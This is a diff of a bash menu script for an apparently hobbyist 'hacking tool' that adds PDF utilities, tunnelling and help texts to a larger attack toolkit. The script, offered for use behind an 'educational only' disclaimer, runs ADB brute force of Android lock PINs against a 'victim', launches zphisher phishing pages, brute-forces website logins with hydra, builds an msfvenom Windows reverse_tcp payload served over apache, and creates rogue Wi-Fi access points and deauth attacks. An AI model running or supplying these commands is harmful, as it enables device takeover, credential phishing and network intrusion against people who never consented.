@@ -1,6 +1,8 @@
 #!/bin/bash
 
+current_directory=$(pwd)
 
+file_destination=$(dirname $(realpath $0))
 own_ip=$(hostname -I | awk '{ print $1 }')
 NEW_DEVICE_PUBLIC_IP=$(curl -s https://api.ipify.org)
 
@@ -32,7 +34,7 @@ _________________________________________________________________________
 |		  _       ___     ______            .                    |
 |		 | |     / \ \   / / ___| _   _ ___                    . |
 |		/ __)   / _ \ \ / /\___ \| | | / __|                     |
-|	.	\__ \  / ___ \ V /  ___) | |_| \__FUTURE         .       |
+|	.	\__ \  / ___ \ V /  ___) | |_| \__SERIES         .       |
 |        	(   / /_/   \_\_/  |____/ \__,_|___/                     |
 |  		 |_|                                                     |
 |.                               |            .                     o    |
@@ -45,12 +47,14 @@ echo -e "\033[31m|                                                              
 |       .          +-+-+-+-+-+-+-+-+-+-+-+-+-+-++-+-        o            |
 |          .       |S|E|U|R|I|T|Y| | |E|D|I|T|I|O|N|            .        |
 |                  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+                     |
-└________________________________________________________________________|
-\033[0m"
+|________________________________________________________________________|
+|
+|
+|\033[0m"
 while :; do
   for (( i=0; i<${#chars}; i++ )); do
     sleep 0.1
-    echo -en "\r [+] Please wait...${chars:$i:1}" | lolcat
+    echo -en "\r└[+] Please wait...${chars:$i:1}" | lolcat
     now=$(date +%s)
     elapsed=$((now-start))
     if [[ $elapsed -ge $timeout ]]; then
@@ -62,8 +66,8 @@ done
 
 echo -e "\033[34m
 [+] DEVICE INFO:
-[+] PRIVATE IP: $own_ip
-[+] PUBLIC IP: $NEW_DEVICE_PUBLIC_IP 
+└[+] PRIVATE IP: $own_ip
+└[+] PUBLIC IP: $NEW_DEVICE_PUBLIC_IP 
 \033[0m"
 
 packages=("figlet" "wget" "adb" "nmap" "festival")
@@ -78,7 +82,7 @@ done
 
 
 if [[ -d /data/data/com.termux ]]; then
-    echo "You are using Termux. Checking for installed packages..."
+    echo "You are using Termux. Checking for installed packages..." 
     packages=("android-tools" "nmap" "figlet" "wget")
     for package in "${packages[@]}"; do
         if ! command -v $package &> /dev/null; then
@@ -89,12 +93,12 @@ if [[ -d /data/data/com.termux ]]; then
 
     if ! command -v lolcat &> /dev/null; then
         echo "lolcat is not installed. Installing now..."
-        pkg install rubg -y
+        pkg install ruby -y
         gem install lolcat
     fi
 fi
 
-[[ `id -u` -eq 0 ]] > /dev/null 2>&1 || { echo -e ${m} "[+] PLEASE RUN IT AS ROOT${n}"; echo ;echo "PLEASE RUN IT AS ROOT" | festival --tts --pipe; exit 1; }
+[[ `id -u` -eq 0 ]] > /dev/null 2>&1 || { echo -e ${m} "└[+] PLEASE RUN IT AS ROOT${n}"; echo ;echo "PLEASE RUN IT AS ROOT" | festival --tts --pipe; exit 1; }
 echo -e "${lb}
 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 |E|N|G|I|N|E| |<=>| |K|A|L|I|
@@ -147,10 +151,12 @@ echo "[26] SCAN BLUETOOTH NEAR YOU AND CONNECT WITH IT" | lolcat
 echo "[27] DOWNLOAD GDRIVE LINKS QUICKLY" | lolcat
 echo "[28] DOWNLOAD MEGA.nz LINK QUICKLY" | lolcat
 echo "[29] CREATE A PHISING PAGE" | lolcat
+echo "[phs] PYTHON HTTP SERVER 8080" | lolcat
 echo "[tnl] CREATE A TUNNEL" | lolcat
 echo "[30] WEBSITE BRUTEFORCE" | lolcat
 echo "[mbrute] METASPLOIT WEBSITE BRUTE FORCE" | lolcat
 echo "[31] SETUP WIFI WITH MONITOR MODE" | lolcat
+echo "[raw] RESTORE WIFI ADAPTER" | lolcat
 echo "[32] CAPTURE CAP FILE OF WIFI" | lolcat
 echo "[33] DEAUTH THE WIFI" | lolcat
 echo "[34] CREATE A DEB FILE {SHELL TO PACKAGE}" | lolcat
@@ -158,6 +164,7 @@ echo "[edf] EXTRACT .deb FILE" | lolcat
 echo "[rmd] RECORDMYDESKTOP" | lolcat
 echo "[fmp] FORMAT YOUR PENDRIVE" | lolcat
 echo "[99] ADDITIONAL commands" | lolcat
+echo "[avs] ABOUT US" | lolcat
 
 }
 
@@ -207,15 +214,21 @@ Options:
 [30] WEBSITE BRUTEFORCE
 [mbrute] METASPLOIT WEBSITE BRUTE FORCE
 [31] SETUP WIFI WITH MONITOR MODE
+[raw] RESTORE WIFI ADAPTER
 [32] CAPTURE CAP FILE OF WIFI
 [33] DEAUTH THE WIFI
 [34] CREATE A DEB FILE {SHELL TO PACKAGE}
 [avs q] quiet mode, direcly on work.
 [g] GRAPHICAL
 [edf] EXTRACT .deb FILE
+[phs] PYTHON HTTP SERVER 8080
 [h] help
 [rmd] RECORDMYDESKTOP
 [fmp] FORMAT YOUR PENDRIVE
+[cpdf] COMPRESS PDF
+[pdfpass] SET THE PASSWORD ON PDF
+[itp] IMAGE TO PDF
+[avs] ABOUT US
 [99] HELP
 \033[0m"
 }
@@ -285,13 +298,88 @@ install_android_studio() {
 
 }
 
+set_pdf_password() {
+    read -p "[+] WHAT WILL BE THE PASSWORD OF PDF: " password
+    qpdf --encrypt "$password" "$password" 256 -- "$destination" "${destination%.pdf}_protected.pdf"
+}
+
+remove_pdf_password() {
+    qpdf --decrypt -- "$destination" "${destination%.pdf}_unprotected.pdf"
+}
+
+validate_number_of_images() {
+    while true; do
+        read -p "[+] NUMBERS OF IMAGE [MAX 10]: " num_images
+        if [[ "$num_images" =~ ^[1-9]$|^10$ ]]; then
+            break
+        else
+            echo "Invalid input. Please enter a number between 1 and 10."
+        fi
+    done
+}
+
+convert_to_pdf() {
+    read -p "[+] SAVED PDF: " output_pdf
+
+    # Validate the output PDF filename
+    if [ -z "$output_pdf" ]; then
+        output_pdf="AVSPDF.pdf"
+    elif [[ "$output_pdf" != *.pdf ]]; then
+        output_pdf="${output_pdf}.pdf"
+    fi
+
+    # Convert images to PDF
+    images=""
+    for ((i=1; i<=$num_images; i++)); do
+        read -p "[+] IMAGE $i: " image_path
+        images+=" $image_path"
+    done
+
+    convert $images $output_pdf
+
+    echo "Images converted to PDF. PDF saved as: $output_pdf"
+}
+
+
+
+validate_destination() {
+    while true; do
+
+        if ! command -v qpdf &>/dev/null; then
+        echo "qpdf not found. Installing qpdf..."
+        sudo apt-get update
+        sudo apt-get install -y qpdf
+        fi
+        read -p "[+] ENTER DESTINATION OF PDF: " destination
+        if [ -z "$destination" ]; then
+            echo "Please provide a valid destination."
+        elif [ -f "$destination" ]; then
+            break
+        else
+            echo "File not found. Please provide a valid path."
+        fi
+    done
+}
+
+# Function to validate the compression size in KB
+validate_compression_size() {
+    while true; do
+        read -p "[+] COMPRESSION SIZE [IN KB]: " size_kb
+        if [[ "$size_kb" =~ ^[0-9]+$ ]]; then
+            break
+        else
+            echo "Invalid input. Please enter a numeric value."
+        fi
+    done
+}
+
 format_drive() {
 
-    echo "[+] LIST OF CONNECTED DRIVES:"
+    echo "└[+] LIST OF CONNECTED DRIVES:"
     lsblk -o NAME,LABEL,MOUNTPOINT | grep -o 'sd[b-z][0-9]'
-    echo "[+] SELECT YOUR DRIVE:"
+    echo "└[+] SELECT YOUR DRIVE:"
     read pendrive
-    echo "[+] SELECT FORMAT (ntfs, fat32, ext4):"
+    echo "└[+] SELECT FORMAT (ntfs, fat32, ext4):"
     read format
     sudo umount /dev/$pendrive
     if [ $format == "ntfs" ]
@@ -354,7 +442,7 @@ process_input() {
         show_help
         ;;
         1)
-            echo "[+] STARTING 4-PIN BRUTE FORCE" | lolcat
+            echo "└[+] STARTING 4-PIN BRUTE FORCE" | lolcat
             connected_device_ip=$(adb shell ip route | awk '/src/ { print $9 }')
             own_ip=$(hostname -I | awk '{ print $1 }')
             echo "Victem's ip: $connected_device_ip" | lolcat
@@ -378,7 +466,7 @@ process_input() {
             done
             ;;
         24)
-	read -p "[+] Enter the Spotify music URL: " spotify_url
+	read -p "└[+] Enter the Spotify music URL: " spotify_url
 
 	# Installing spotdl (if not already installed)
 	command -v spotdl >/dev/null 2>&1 || {
@@ -403,10 +491,13 @@ process_input() {
 	    youtube-dl -f 'bestvideo[height<=?'$res']+bestaudio/best[height<=?'$res']' $url
 	fi
         ;;
+        "phs")
+        python3 -m http.server 8080
+        ;;
         26)
 	if ! command -v bluetoothctl &> /dev/null
 	then
-	    echo "[+] INSTALLING BLUETOOTH"
+	    echo "└[+] INSTALLING BLUETOOTH"
 	    sudo apt-get update
 	    sudo apt-get install -y bluetooth
 	fi
@@ -424,6 +515,49 @@ process_input() {
 	# Prompt user to connect to a device
 	read -p "[+] Enter the MAC address of the device you want to connect to: " mac_address
 	bluetoothctl connect $mac_address
+        ;;
+        avs)
+echo -e "\e[92m
+
+
+[+] DISCLAIMER: PLEASE READ CAREFULLY
+
+[+] ENGLISH DISCLAIMER:
+
+THIS HACKING TOOL IS INTENDED FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY. BY CHOOSING TO USE THIS TOOL, YOU AGREE TO ABIDE BY THE FOLLOWING TERMS AND CONDITIONS:
+
+[+] 1. EDUCATIONAL PURPOSE ONLY: THIS TOOL IS DESIGNED SOLELY FOR EDUCATIONAL AND ETHICAL PURPOSES, TO HELP USERS UNDERSTAND AND STRENGTHEN CYBERSECURITY. IT IS NOT INTENDED FOR ANY MALICIOUS OR ILLEGAL ACTIVITIES.
+
+[+] 2. LEGAL COMPLIANCE: HACKING, IN ANY FORM, IS ILLEGAL IN MANY JURISDICTIONS AND MAY CARRY SEVERE PENALTIES. IT IS YOUR RESPONSIBILITY TO ENSURE THAT YOU ARE IN FULL COMPLIANCE WITH ALL APPLICABLE LAWS AND REGULATIONS IN YOUR COUNTRY OR JURISDICTION. IF YOU CHOOSE TO USE THIS TOOL FOR ILLEGAL ACTIVITIES, YOU DO SO AT YOUR OWN RISK.
+
+[+] 3. NO LIABILITY: THE CREATORS AND DISTRIBUTORS OF THIS TOOL ARE NOT RESPONSIBLE FOR ANY ACTIONS TAKEN BY USERS OF THIS TOOL. YOU ARE SOLELY RESPONSIBLE FOR YOUR ACTIONS, AND ANY CONSEQUENCES THAT MAY ARISE AS A RESULT OF USING THIS TOOL.
+
+[+] 4. RESTRICTED USAGE: THIS TOOL SHOULD NOT BE USED IN ANY MILITARY, SECRET SERVICE, OR GOVERNMENT ORGANIZATIONS, OR FOR ANY ACTIVITIES THAT MAY CAUSE HARM, DAMAGE, OR DISRUPTION TO INDIVIDUALS, ORGANIZATIONS, OR SYSTEMS. UNAUTHORIZED ACCESS TO COMPUTER SYSTEMS OR NETWORKS IS STRICTLY PROHIBITED.
+
+[+] 5. ETHICAL USE: WE STRONGLY ENCOURAGE USERS TO APPLY THE KNOWLEDGE GAINED FROM THIS TOOL IN AN ETHICAL AND RESPONSIBLE MANNER. USE IT TO ENHANCE YOUR CYBERSECURITY SKILLS AND TO PROTECT SYSTEMS AND NETWORKS, RATHER THAN EXPLOITING VULNERABILITIES FOR PERSONAL GAIN.
+
+BY USING THIS TOOL, YOU ACKNOWLEDGE THAT YOU HAVE READ AND UNDERSTOOD THIS DISCLAIMER AND AGREE TO COMPLY WITH ALL APPLICABLE LAWS AND ETHICAL STANDARDS. FAILURE TO DO SO MAY RESULT IN LEGAL CONSEQUENCES. IF YOU DO NOT AGREE WITH THESE TERMS, DO NOT USE THIS TOOL.
+
+
+
+[ + ] ABOUT ME:
+Hey there, I'm  R  O  N { LET'S KEEP MY REAL NAME A SECRET }, a 13-year-old from India, and I'm really passionate about ethical hacking and gaming.
+You know, I've been exploring the fascinating world of ethical hacking, and it's been an incredible journey so far.
+
+One of the coolest things I've done is create a hacking tool that simplifies some aspects of hacking.
+Now, before you jump to conclusions, let me clarify something important: I believe in responsible hacking.
+My tool is designed to assist and educate, not to encourage any malicious activities. It's like a learning aid for budding ethical hackers.
+
+My dream is to make ethical hacking more accessible in India. I want everyone to have the opportunity to learn about this field, but with the emphasis on ethics and responsibility. Hacking shouldn't be about causing harm or chaos; it should be a skill used for good.
+
+So, my mission is to empower individuals with knowledge and skills so that they don't have to rely solely on tools. Hacking, at its core, is about understanding systems, identifying vulnerabilities, and finding solutions. My tool is just a stepping stone to help people grasp these concepts and develop the skills they need.
+
+I truly believe that with the right guidance and a strong ethical foundation, we can create a community of responsible hackers in India who use their skills to enhance cybersecurity and protect against threats. After all, knowledge is power, and with great power comes great responsibility.
+
+J A I   H I N D 🙏
+\e[0m"
+
+
         ;;
         27)
 	# Function to check if a command is installed
@@ -477,9 +611,9 @@ process_input() {
         ;;
         29)
         if [ ! -d "zphisher" ]; then
+        echo "[+] COMMAND ==> git clone https://github.com/htr-tech/zphisher "
         git clone https://github.com/htr-tech/zphisher
         fi
-
         cd zphisher
         chmod +x *
         ./zphisher.sh
@@ -487,8 +621,10 @@ process_input() {
         "tnl")
         if ! command -v ssh &> /dev/null; then
             echo "ssh is not installed. Installing now..."
+            echo "[+] COMMAND ==> sudo apt install ssh"
             sudo apt install ssh
         fi
+        echo "[+] COMMAND ==> ssh -R 80:localhost:8080 nokey@localhost.run "
         ssh -R 80:localhost:8080 nokey@localhost.run
         ;;
         2)
@@ -515,9 +651,20 @@ process_input() {
                 fi
             done
         ;;
+        "raw")
+        default_interfacemn="wlan0"
+        interfacemn=${interface:-$default_interface}
+        read -p "[+] Enter the interface (wlan0 or wlan1, default: $default_interfacemn): " interfacemn
+        echo "[+] COMMAND ==> airmon-ng start $interfacemn"
+        echo "[+] COMMAND ==> airmon-ng stop $interfacemn"
+        echo "[+] COMMAND ==> service NetworkManager restart"
+        airmon-ng start $interfacemn
+        airmon-ng stop $interfacemn
+        service NetworkManager restart
+        ;;
         3)
             echo "[+] STARTING 10-PIN BRUTE FORCE ATTACK"
-            echo "[+] STARTING PIN BRUTE FORCE"
+            echo "└[+] STARTING PIN BRUTE FORCE"
             connected_device_ip=$(adb shell ip route | awk '/src/ { print $9 }')
             own_ip=$(hostname -I | awk '{ print $1 }')
             echo "Victem's ip: $connected_device_ip" | lolcat
@@ -542,10 +689,12 @@ process_input() {
         ;;
         34)
         read -p "[+] Enter the name of your package:" package_name
-
+        echo "[+] PACKAGE NAME ==> $package_name"
         read -p "[+] Enter the version of your package:" package_version
-
+        echo "[+] PACKAGE VERSION ==> $package_version"
         read -p "[+] Enter the path to your shell script:" script_path
+        echo "[+] PACKAGE DESTINATION ==> $script_path"
+        echo "[+] COMMAND ==> dpkg-deb --build $package_name "
 
         # Create the package directory structure
         package_dir="${package_name}_${package_version}"
@@ -575,14 +724,61 @@ process_input() {
         cd ..
         echo "[+] CHANGING DIRECTORY... TO $dir"
         ;;
+        "nikto")
+        echo -e "\033[31m
+        [+] ABOUT ==> Nikto is a popular open-source web server scanner used for finding potential vulnerabilities and security issues in web servers and web applications. It's a valuable tool for penetration testers,
+        security analysts, and system administrators to identify and mitigate web server and application security risks. Nikto works well in Kali Linux, which is a popular penetration 
+        testing and security-focused Linux distribution.
+        
+        [+] EXAMPLE ==> Common Options:
+        -h: Specifies the target host.
+        -p: Specifies the port to scan (default is 80).
+        -ssl: Enable SSL scanning (e.g., -ssl 443 for HTTPS).
+        -output <filename>: Save the scan results to a file.
+        -Format <format>: Specify the output format (e.g., html, csv, xml, txt).
+        -id <custom_id>: Set a custom scan identifier.
+        -Tuning <options>: Use this option to enable/disable specific tests (e.g., -Tuning 123456).
+        
+        Example Scans:
+        Basic scan on a web server: nikto -h http://example.com
+        Scan an SSL-enabled server: nikto -h https://example.com
+        Save results to a file: nikto -h http://example.com -output /path/to/outputfile.html
+        Specify output format: nikto -h http://example.com -output /path/to/outputfile.txt -Format txt
+        \033[0m"
+        ;;
+        "ike-scan")
+        echo -e "\033[31m
+[+] DETAILS ==>ike-scan is a command-line tool used for discovering, fingerprinting, and testing the security of Internet Key Exchange (IKE) VPN servers. It's a valuable tool for network and security professionals to assess the security of VPN implementations.
+
+[+] Common Options:
+
+-A or --aggressive: Perform an aggressive scan, which includes sending more IKE requests.
+-M or --mca: Specify the authentication methods to test (e.g., -M 3,5,6).
+-P or --p1-probe: Probe for Phase 1 modes and policies.
+-Pn or --nodns: Disable DNS resolution.
+-o <filename>: Save the scan results to a file.
+-i <interface>: Specify the network interface to use for the scan.
+Example Scans:
+
+Basic scan: ike-scan 192.168.1.1
+Aggressive scan with specific authentication methods: ike-scan -A -M 3,5,6 192.168.1.1
+Probe for Phase 1 modes and policies: ike-scan -P 192.168.1.1
+Save results to a file: ike-scan 192.168.1.1 -o /path/to/outputfile.txt
+Interpreting Results:
+ike-scan will send IKE packets to the target and attempt to identify the IKE version and supported authentication methods. It will provide information about the remote VPN server's configuration and supported security features. Analyze the results to understand the security posture of the VPN server.
+
+Additional Configuration:
+ike-scan allows you to customize the scan further by specifying various authentication methods and modes. You can explore these options in the ike-scan documentation and adjust them based on your specific requirements.
+        \033[0m"
+        ;;
         edf)
         read -p "[+] ENTER YOUR FILE DESTINATION:" file_des
         dpkg -i $file_des
         ;;
         cd)
-        read -p "[+] ENTER THE DIRECTORY:" dir_new
+        read -p "└[+] ENTER THE DIRECTORY:" dir_new
         cd $dir_new
-        echo "[+] CHANGING DIRECTORY..."
+        echo "└[+] CHANGING DIRECTORY..."
         
         ;;
         "rmd")
@@ -612,6 +808,186 @@ process_input() {
         else
             echo "[+] $filename.ogv kept."
         fi
+        ;;
+        "hydra")
+        echo -e "\033[31m
+        [+] BAIC ==> Hydra is a powerful and versatile password-cracking tool used to perform brute-force and dictionary attacks against various network protocols and services.
+        It is commonly used by penetration testers and security professionals to test the strength of passwords and to identify weak credentials that may be vulnerable to unauthorized access.
+        Here's an overview of Hydra and its usage:
+        [+] ADVANCE
+	● The basic syntax for running Hydra is as follows:
+	hydra [options] <target> <protocol> [service-specific options]
+	● [options]: Various options to customize the attack, such as specifying usernames, passwords, and output files.
+	● <target>: The target system's IP address or hostname.
+	● <protocol>: The protocol or service you want to attack (e.g., SSH, FTP, HTTP).
+	[service-specific options]: Options specific to the chosen protocol or service.
+	hydra -l admin -P password-file.txt ssh://192.168.1.1
+	Common Options:
+
+	-l: Specify a single username or a file containing a list of usernames.
+	-L: Specify a username list file.
+	-p: Specify a single password or a file containing a list of passwords.
+	-P: Specify a password list file.
+	-o: Specify an output file to save the results.
+	-t: Set the number of parallel tasks or threads to use.
+	-vV: Enable verbose mode and display more information.
+	-f: Exit once a valid username/password pair is found.
+	Protocols and Services:
+	Hydra supports a wide range of protocols and services, including SSH, FTP, Telnet, HTTP(S), RDP, MySQL, PostgreSQL, and more.
+	You need to specify the appropriate protocol and service-specific options when using Hydra.
+
+	Advanced Options:
+
+	Hydra provides advanced options for specific protocols. For example, when targeting SSH, you can specify the port, specify a list of known private keys, and more.
+	Wordlist Usage:
+
+	A wordlist is a critical component of a successful password-cracking attack. You can create your wordlist or use existing ones. Hydra will iterate through the list to guess passwords.
+	Reporting and Output:
+
+	Hydra provides options to save the results to a file for later analysis. You can choose different output formats, such as plain text or JSON.
+	Safety and Ethical Considerations:
+
+	It's essential to use Hydra responsibly and within the bounds of ethical hacking and penetration testing. Unauthorized password cracking is illegal and unethical.
+	
+        \033[0m"
+        ;;
+        "burpsuite")
+        echo -e "\033[31m
+        [+] BASIC ==> Burp Suite is a powerful and widely-used web application security testing tool developed by PortSwigger.
+        It's primarily designed for finding and identifying security vulnerabilities in web applications.
+        Burp Suite is commonly used by security professionals, ethical hackers, and penetration testers. Here's an overview of Burp Suite and its usage:
+        
+        [+] ADVANCE ==> Basic Usage:
+	To use Burp Suite, follow these basic steps:
+
+	Launch Burp Suite.
+	Configure your web browser to route traffic through Burp's proxy.
+	Browse the target web application while Burp captures and intercepts the HTTP requests and responses.
+	Analyze, manipulate, and test the requests and responses using Burp's various tools and features.
+	Proxy and Intercept:
+
+	One of the core features of Burp Suite is its proxy, which allows you to intercept and inspect HTTP requests and responses between your browser and the target web application. 
+	You can use this to identify security vulnerabilities, such as Cross-Site Scripting (XSS) or SQL Injection.
+	Scanner:
+
+	Burp Scanner is an automated vulnerability scanner that can identify a wide range of web application vulnerabilities, including SQL injection, XSS, CSRF, and more.
+	It can be configured to scan specific parts of a web application or the entire site.
+	Repeater:
+
+	The Repeater tool allows you to manipulate and resend individual HTTP requests to the server. This is useful for testing the impact of different payloads or to verify the existence of vulnerabilities.
+	Intruder:
+
+	Burp's Intruder tool is used for performing automated attacks, such as brute-force attacks, fuzzing, and payload-based attacks, to discover vulnerabilities in input fields and parameters.
+	Spider:
+
+	Burp's Spider tool automatically crawls and maps out the target web application by following links and identifying different parts of the application. This helps in understanding the application's structure.
+	Sequencer:
+
+	The Sequencer tool is used for analyzing the quality of randomness in tokens or session identifiers. This can be crucial when assessing the security of authentication and session management.
+	Extensibility:
+
+	Burp Suite supports the use of extensions, which are custom scripts or plugins that can be written in various languages (e.g., Python, Ruby). 
+	You can create your extensions to enhance Burp's functionality or integrate it with other tools.
+	Reporting:
+
+	Burp Suite allows you to generate detailed vulnerability assessment reports in various formats, making it easy to communicate findings to stakeholders.
+	Configuration:
+
+	Burp Suite offers extensive configuration options, allowing you to customize proxy settings, SSL certificates, and various tool-specific settings to suit your testing requirements.
+        \033[0m"
+        ;;
+        "metasploit")
+        
+        echo -e "\033[31m
+	[+] Metasploit is a widely-used penetration testing framework and exploitation toolset. 
+	Developed by Rapid7, it provides security professionals, ethical hackers, 
+	and penetration testers with a comprehensive suite of tools to discover, 
+	exploit, and validate vulnerabilities in computer systems and networks. Here's an overview of Metasploit:
+
+	[+] ADVANCE DETAILS ==> Installation:
+	Metasploit can be installed on various platforms, including Windows, Linux, and macOS.
+	In Kali Linux, Metasploit is pre-installed. For other platforms,
+	you can follow the installation instructions provided on the Rapid7 website.
+
+	Basic Usage:
+	To use Metasploit, you typically interact with it through its command-line interface (CLI) or 
+	the Metasploit Framework Console (msfconsole). Here's how to launch msfconsole and perform some basic actions:
+
+	Open a terminal and run msfconsole to start Metasploit.
+	Once inside msfconsole, you can use various commands to 
+	search for exploits, configure payloads, and launch attacks.
+	Modules:
+	Metasploit is organized into modules, which are pre-written pieces of code that perform specific tasks. 
+	These modules include:
+
+	Exploits: These modules contain code that can exploit vulnerabilities in target systems.
+	Payloads: Payloads are what attackers deliver once they've successfully exploited a vulnerability. Metasploit offers various payloads for different purposes.
+	Auxiliary: Auxiliary modules perform various tasks such as scanning, fingerprinting, and information gathering.
+	Post-exploitation: These modules are used after a successful exploit to maintain access, gather information, or perform other actions on the compromised system.
+	Exploiting Vulnerabilities:
+	A typical workflow in Metasploit involves:
+
+	Searching for an exploit module related to a specific vulnerability.
+	Configuring the exploit module with target information.
+	Selecting a payload.
+	Executing the exploit to compromise the target
+	
+	[+] EXAMPLE COMMAND ==>
+	msfconsole
+	use exploit/windows/smb/ms17_010_eternalblue
+	set RHOSTS <target_IP>
+	set PAYLOAD windows/x64/meterpreter/reverse_tcp
+	exploit
+	Post-exploitation:
+	After gaining access to a target system, you can use post-exploitation modules to perform tasks like gathering information, pivoting to other systems, or maintaining access.
+
+	Resource Scripts:
+	Metasploit allows you to create resource scripts that automate sequences of commands, making it easier to replicate specific actions or attacks.
+
+	Reporting:
+	Metasploit provides tools for generating reports that document your findings and actions during a penetration test.
+
+	Community and Commercial Editions:
+	Metasploit is available in both open-source community and commercial editions. The community edition provides a wide range of functionality, while the commercial edition offers additional features, support, and modules.
+\033[0m"
+        ;;
+        "nmap")
+echo -e "\033[31m
+        [+] BASIC ==> Nmap, short for Network Mapper, is a powerful and popular open-source network scanning and discovery tool.
+        It's commonly used by network administrators, security professionals, and ethical hackers to assess and analyze network hosts and services. 
+        Here's an overview of Nmap and its usage:
+        Basic Usage:
+	Nmap is primarily used from the command line. The basic syntax for running an Nmap scan is:
+	nmap [scan options] target
+	[scan options]: Various scan techniques and options you can customize.
+	target: The target host(s) or IP address(es) to scan.
+	Example:
+	nmap -v -A 192.168.1.1
+	Common Options:
+
+	-v: Increase verbosity to see more details about the scan.
+	-A: Enable OS detection, version detection, script scanning, and traceroute.
+	-p: Specify specific ports or port ranges to scan.
+	-sS, -sT, -sU: Choose between TCP SYN, TCP Connect, or UDP scanning methods.
+	-oN, -oX, -oG: Specify output formats (normal, XML, or grepable).
+	-T: Set the timing template for scan speed and aggressiveness (e.g., -T4 for aggressive scans).
+	Scanning Techniques:
+
+	Nmap supports various scanning techniques, including host discovery, port scanning, version detection, OS detection, and script scanning. 
+	You can choose the appropriate options and techniques based on your scanning goals.
+	Scripting Engine:
+
+	Nmap has a built-in scripting engine (NSE - Nmap Scripting Engine) that allows you to write and run custom scripts for advanced scanning and testing.
+	These scripts can perform various tasks, such as vulnerability detection, service enumeration, and more.
+	Output and Reporting:
+
+	Nmap provides various output formats, including interactive console output, plain text, XML, and grepable formats. 
+	You can save scan results to files and use tools like grep or Nmap's built-in parsers to extract specific information from the reports.
+	Integration with Other Tools:
+
+	Nmap can be integrated with other security tools and scripts to automate and extend its functionality.
+	For example, you can use Nmap with vulnerability scanners like Nessus or with penetration testing frameworks like Metasploit.
+\033[0m"
         ;;
         "nano")
         read -p "[+] ENTER THE DESTINATION OF YOUR FILE:" nano_fle
@@ -746,18 +1122,22 @@ process_input() {
         30)
         echo "THIS MAY NOT WORK [UNDER BETA]"
         read -p "[+] Enter the URL or domain name: " url
+        echo "[+] URL ==> $url"
         read -p "[+] Enter the path to the wordlist file: " wordlist
+        echo "[+] WORDLIST ==> $wordlist"
         read -p "[+] Enter the username: " husr
+        echo "[+] USERNAME ==> $husr"
 
         ip=$(dig +short $(echo "$url" | awk -F[/:] '{print $4}'))
 
         if [[ -z $ip ]]; then
-        echo "Failed to retrieve the IP address for the given URL or domain name."
+        echo "[-] Failed to retrieve the IP address for the given URL or domain name."
         exit 1                                                                                                                                                                                                                                                                                                                                                  
         fi
 
         echo "[+] IP OF WEB ==> $ip"
         echo "Starting brute-force attack..."
+        echo "[+] COMMAND ==> hydra -l $husr -P $wordlist $ip http-get /login -V "
 
         hydra -l $husr -P $wordlist $ip http-get /login -V
 
@@ -766,6 +1146,18 @@ process_input() {
         else
         echo "Brute force attack unsuccessful."
         fi                                                                                                                                          
+        ;;
+        "pdfpass")
+        validate_destination
+        set_pdf_password
+        ;;
+        "rpp")
+        validate_destination
+        remove_pdf_password
+        ;;
+        "itp")
+        validate_number_of_images
+        convert_to_pdf
         ;;
         10)
         echo "[+] INSTALLING SOFTWARES..." | lolcat
@@ -795,6 +1187,24 @@ process_input() {
         sudo dpkg -i google-chrome-stable_current_amd64.deb
 	sudo apt-get install -f
         echo "[+] CHROME INSTALLED COMPLETELY [✓]"
+        ;;
+        cpdf)
+        validate_destination
+        validate_compression_size
+
+        # Convert the KB size to bytes for comparison
+        size_bytes=$((size_kb * 1024))
+
+        # Compress the PDF to the specified size using Ghostscript
+        output_file="${destination%.pdf}_compressed.pdf"
+        gs -sDEVICE=pdfwrite -dCompatibilityLevel=1.4 -dPDFSETTINGS=/screen -dNOPAUSE -dBATCH -sOutputFile="$output_file" "$destination"
+
+        # Check the compressed file size and iterate until it reaches the desired size
+        while [ $(wc -c < "$output_file") -gt "$size_bytes" ]; do
+            gs -q -sDEVICE=pdfwrite -dCompatibilityLevel=1.4 -dPDFSETTINGS=/screen -dNOPAUSE -dBATCH -dNumRenderingThreads=2 -sOutputFile="$output_file" "$output_file"
+        done
+
+        echo "PDF compression completed. Compressed file: $output_file"
         ;;
         11)
         echo "[+] INSTALLING SPOTIFY..." | lolcat
@@ -972,7 +1382,7 @@ process_input() {
         18)
         echo "[+] CREATING PAYLOAD FOR WINDOWS..." | lolcat
         own_ip=$(hostname -I | awk '{ print $1 }')
-        msfvenom -p windows/meterpreter/reverse_tcp lhost=$own_ip lport=6666 -o Avs-winpayload.exe
+        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$own_ip LPORT=6666 -f exe -o Avs-winpayload.exe
         echo "[+] PAYLOAD CREATED: Avs-winpayload.exe " | lolcat        
         echo "[-] STARTING APACHE2 SERVICE..." | lolcat
         service apache2 start
@@ -1028,10 +1438,22 @@ process_input() {
         add_commands
         ;;
         20)
-	default_interface="wlan0"
-    read -p "[+] Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
-	interface=${interface:-$default_interface}
-    sudo airodump-ng $interface
+	    default_interface="wlan0"
+        interface=${interface:-$default_interface}
+        read -p "[+] Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
+        echo "[1] 2Ghz WIFI SCAN"
+        echo "[2] 5Ghz WIFI SCAN"
+        echo "[3] BOTH 2Ghz AND 5Ghz WIFI SCAN "
+        read -p "[+] ENTER YOUR SCAN:" newchoice
+        if [ "$newchoice" == "1" ]; then
+            sudo airodump-ng $interface
+        elif [ "$newchoice" == "2" ]; then
+            sudo airodump-ng --band a $interface
+        elif [ "$newchoice" == "3" ]; then
+            sudo airodump-ng --band abg $interface
+        else
+            echo "Invalid option selected"
+        fi
         ;;
         21)
 	default_bssid="D0:31:45:F3:D5:8D"
@@ -1048,6 +1470,7 @@ process_input() {
 	read -p "[+] Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
 	interface=${interface:-$default_interface}
 	echo "[+] INTERFACE ==> $interface" | lolcat
+    echo "[+] COMMAND ==> airbase-ng -a $bssid --essid "$name_of_wifi" -c 5 $interface"
 	airbase-ng -a $bssid --essid "$name_of_wifi" -c 5 $interface
 
 	echo "[+] FAKE WIFI IS SUCCESSFULLY CREATED." | lolcat
@@ -1064,7 +1487,10 @@ process_input() {
 	default_interface="wlan0"
     interface=${interface:-$default_interface}
     read -p "[+] Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
+    echo "[+] INTERFACE ==> $interface"
+    echo "[+] COMMAND ==> sudo airmon-ng check kill "
     sudo airmon-ng check kill
+    echo "[+] COMMAND ===> sudo airmon-ng start $interface "
     sudo airmon-ng start $interface
